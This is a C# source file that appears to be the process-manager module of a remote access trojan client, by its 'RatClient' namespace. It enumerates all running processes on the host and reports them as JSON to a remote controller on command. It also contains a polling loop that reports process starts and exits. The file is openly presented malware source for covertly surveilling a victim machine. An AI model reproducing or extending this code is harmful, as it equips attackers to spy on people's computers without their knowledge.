using System;
using System.Linq;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Diagnostics;

namespace RatClient.Features
{
    class ProcessManager
    {
        #region Variables
        private readonly Action<object> SendJson;
        private bool isListening = false;
        #endregion

        #region Constructor
        public ProcessManager(Action<object> sendJson)
        {
            this.SendJson = sendJson;

            Program.MessageReceived += HandleMessage;
        }
        #endregion

        #region Methods
        public void GetProcesses()
        {
            var processes = Process.GetProcesses().Select(p => new
            {
                DisplayName = p.MainWindowTitle,
                ProcessName = p.ProcessName,
                Pid = p.Id
            }).ToList();

            var jsonSerializer = new System.Web.Script.Serialization.JavaScriptSerializer();
            string processesJson = jsonSerializer.Serialize(processes);
            SendJson(new { type = "pm_list", data = processesJson });
        }

        public void StartListening()
        {
            isListening = true;
            Task.Run(() => ListenForProcessChanges());
        }

        public void StopListening()
        {
            isListening = false;
        }

        private void ListenForProcessChanges()
        {
            var existingProcesses = Process.GetProcesses().ToDictionary(p => p.Id);

            while (isListening)
            {
                var currentProcesses = Process.GetProcesses().ToDictionary(p => p.Id);

                var addedProcesses = currentProcesses.Values.Except(existingProcesses.Values).ToList();
                var removedProcesses = existingProcesses.Values.Except(currentProcesses.Values).ToList();

                foreach (var process in addedProcesses)
                {
                    SendJson(new
                    {
                        type = "pm_start",
                        DisplayName = process.MainWindowTitle,
                        ProcessName = process.ProcessName,
                        PID = process.Id
                    });
                }

                foreach (var process in removedProcesses)
                {
                    SendJson(new
                    {
                        type = "pm_kill",
                        DisplayName = process.MainWindowTitle,
                        ProcessName = process.ProcessName,
                        PID = process.Id
                    });
                }

                existingProcesses = currentProcesses;
                Task.Delay(1000).Wait();
            }
        }
        #endregion

        #region Event Handlers
        private void HandleMessage(dynamic message)
        {
            if (message["type"] == "pm_listen")
            {
                Console.WriteLine("Listening for process changes...");
                GetProcesses();
                // StartListening();
            }
            else if (message["type"] == "pm_stop")
            {
                StopListening();
            }
        }
        #endregion
    }
}